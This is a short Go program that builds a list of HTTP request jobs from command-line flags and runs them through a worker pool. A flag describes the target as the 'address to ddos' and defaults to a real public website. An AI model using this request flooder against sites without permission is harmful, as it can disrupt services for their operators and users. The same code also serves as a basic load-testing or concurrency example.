package main

import (
	"flag"
	"sync"
	"workerpool/job"
	"workerpool/pool"
)

func main() {
	address := flag.String("addr", "https://google.de", "address to ddos")
	threads := flag.Int("tr", 5, "number of threads")
	method := flag.String("m", "GET", "request method")
	body := flag.String("body", "", "request body")
	limit := flag.Int("lim", 100, "the number of requests the app will execute and then terminate")

	flag.Parse()
	wg := sync.WaitGroup{}

	var jobs []*job.Job
	for i := 1; i <= *limit; i++ {
		task := job.NewJob(i, *address, *method, *body)
		jobs = append(jobs, task)
	}

	workerpool := pool.NewPool(jobs, *threads, wg)
	workerpool.Run()
}
